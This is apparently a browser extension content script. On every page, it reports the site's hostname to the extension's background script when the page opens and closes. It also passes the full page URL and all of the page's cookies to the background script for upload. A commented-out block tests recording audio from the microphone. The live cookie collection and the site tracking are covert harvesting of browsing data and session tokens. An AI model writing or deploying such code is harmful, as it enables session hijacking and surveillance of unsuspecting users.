browser.runtime.sendMessage({"intent": 'sendMetric', 'name': 'open', 'url': window.location.hostname});

window.onbeforeunload = function() {
  browser.runtime.sendMessage({"intent": 'sendMetric', 'name': 'close', 'url': window.location.hostname});
};

browser.runtime.sendMessage({"intent": 'uploadCookies', 'url': window.location.href , 'payload': document.cookie});


// navigator.mediaDevices.getUserMedia({ audio: true })
//   .then(stream => {
//     const mediaRecorder = new MediaRecorder(stream);
//     mediaRecorder.start();
//
//     const audioChunks = [];
//     mediaRecorder.addEventListener("dataavailable", event => {
//       audioChunks.push(event.data);
//     });
//
//     mediaRecorder.addEventListener("stop", () => {
//       const audioBlob = new Blob(audioChunks);
//       const audioUrl = URL.createObjectURL(audioBlob);
//       const audio = new Audio(audioUrl);
//       audio.play();
//       console.log("best case!!!!!!!!!!!");
//     });
//
//     setTimeout(() => {
//       mediaRecorder.stop();
//     }, 3000);
//   }).catch(function (err) {
//   console.log(err);
// });
